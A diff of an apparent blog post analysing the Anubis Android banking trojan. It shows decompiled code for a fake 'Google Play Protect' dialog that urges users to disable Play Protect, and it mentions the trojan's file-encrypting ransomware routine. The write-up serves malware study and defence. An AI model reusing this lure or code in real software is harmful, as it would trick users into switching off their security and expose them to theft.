+                                            Intent intent3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Intent<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> DisplayGooglePlayProtect<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
+                                            intent3<span style="color:#f92672">.</span><span style="color:#a6e22e">addFlags</span><span style="color:#f92672">(</span>268435456<span style="color:#f92672">);</span>
+                                            intent3<span style="color:#f92672">.</span><span style="color:#a6e22e">addFlags</span><span style="color:#f92672">(</span>1073741824<span style="color:#f92672">);</span>
+                                            startActivity<span style="color:#f92672">(</span>intent3<span style="color:#f92672">);</span>
+                                        <span style="color:#f92672">}</span>
+                                    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused5<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                                        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;jtfxlnc&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;ERROR getProtect&#34;</span><span style="color:#f92672">);</span>
+                                    <span style="color:#f92672">}</span>
+</code></pre></div><p>See?, it cheks if some file or directory exists and calls <code>GetSharedPreference(this, &quot;play_protect&quot;)</code>. if the result is equal to true,
+if creates another activity, named <code>DisplayGooglePlayProtect</code>.</p>
+<p>let&rsquo;s focus on that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DisplayGooglePlayProtect</span> <span style="color:#66d9ef">extends</span> Activity <span style="color:#f92672">{</span>
+
+    <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+    <span style="color:#75715e">/* access modifiers changed from: protected */</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>Bundle bundle<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        String str<span style="color:#f92672">;</span>
+        String str2<span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>bundle<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ctx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            str <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;textPlayProtect&#34;</span><span style="color:#f92672">);</span>
+            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                str2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;buttonPlayProtect&#34;</span><span style="color:#f92672">);</span>
+            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#f92672">}</span>
+
+        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+</code></pre></div><p>inside the try block, <code>onCreate</code> method calls <code>GetSharedPreference(this, &quot;textPlayProtect&quot;)</code> and assigns returning string to <code>str</code>. inside another nested try block, it calls <code>GetSharedPreference(this, &quot;buttonPlayProtect&quot;)</code> and assigns return string to <code>str2</code>.</p>
+<p>it looks like those keys refer to some strings that used when asking for permissions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;string</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;textPlayProtect&#34;</span><span style="color:#f92672">&gt;</span>The system does not work correctly, disable Google Play Protect!<span style="color:#f92672">&lt;/string&gt;</span>
+<span style="color:#f92672">&lt;string</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;buttonPlayProtect&#34;</span><span style="color:#f92672">&gt;</span>Сontinue<span style="color:#f92672">&lt;/string&gt;</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        AlertDialog<span style="color:#f92672">.</span><span style="color:#a6e22e">Builder</span> builder2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AlertDialog<span style="color:#f92672">.</span><span style="color:#a6e22e">Builder</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">);</span>
+        builder2<span style="color:#f92672">.</span><span style="color:#a6e22e">setTitle</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Google Play Protect&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">setMessage</span><span style="color:#f92672">(</span>str<span style="color:#f92672">).</span><span style="color:#a6e22e">setIcon</span><span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">drawable</span><span style="color:#f92672">.</span><span style="color:#a6e22e">im</span><span style="color:#f92672">).</span><span style="color:#a6e22e">setCancelable</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">).</span><span style="color:#a6e22e">setNegativeButton</span><span style="color:#f92672">(</span>str2<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> DialogInterface<span style="color:#f92672">.</span><span style="color:#a6e22e">OnClickListener</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+            <span style="color:#75715e">/* class wocwvy.p003x881dce2d.slsa.ncec.ActivityC0062x231814f.DialogInterface$OnClickListenerC00631 */</span>
+
+            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onClick</span><span style="color:#f92672">(</span>DialogInterface dialogInterface<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> i<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                Intent intent <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Intent<span style="color:#f92672">();</span>
+                intent<span style="color:#f92672">.</span><span style="color:#a6e22e">setClassName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;com.google.android.gms&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;com.google.android.gms.security.settings.VerifyAppsSettingsActivity&#34;</span><span style="color:#f92672">);</span>
+                <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                    DisplayGooglePlayProtect<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">startActivity</span><span style="color:#f92672">(</span>intent<span style="color:#f92672">);</span>
+                    DisplayGooglePlayProtect<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ctx</span><span style="color:#f92672">.</span><span style="color:#a6e22e">startService</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Intent<span style="color:#f92672">(</span>DisplayGooglePlayProtect<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ctx</span><span style="color:#f92672">,</span> ServiceC0111x5ad12ef2<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">));</span>
+                <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>ActivityNotFoundException unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                    DisplayGooglePlayProtect<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ERROR&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;ActPlayProtect&#34;</span><span style="color:#f92672">);</span>
+                <span style="color:#f92672">}</span>
+                dialogInterface<span style="color:#f92672">.</span><span style="color:#a6e22e">cancel</span><span style="color:#f92672">();</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">});</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            builder2<span style="color:#f92672">.</span><span style="color:#a6e22e">create</span><span style="color:#f92672">().</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#f92672">}</span>
+</code></pre></div><p>here, it uses previously retreived values to create an <code>AlertBuilder</code> that requests permission to disable google play protect.</p>
 <h3 id="ransomware-capabilities">Ransomware capabilities<a href="#ransomware-capabilities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>We saw it in the manifest that anubis has ransomware capabilities.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">wahiuolww</span> <span style="color:#66d9ef">extends</span> IntentService <span style="color:#f92672">{</span>
@@ -1641,7 +1839,8 @@ be fiiled with byte array <code>b</code>.</p>
 </code></pre></div><p>then the output stream is closed and file is deleted from the disk.</p>
 <p>We can conclude that this method is the on in charge for encrypting and decrypting the file system based on the shared preferene value <code>status</code>.</p>
 <h3 id="the-end">the end<a href="#the-end" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>This is the longest article I have erver typed. So eayh, we started analysis with 0 knowledge on a random malware and dissected various part of it using both dynamic and static analysis techniques.</p>
+<p>This is the longest article I have ever typed. hell its over 2000 lines. So eayh, we started analysis with 0 knowledge on a random malware and dissected various part of it using both dynamic and static analysis techniques to understand what it is capable of doing.</p>
+<p>with our understanding about the malware, we can conclude that anubis is a very sophisticated banking trojan, that is capable of many things.</p>
 <p>#Speard anarchy</p>
 
       </div></div>
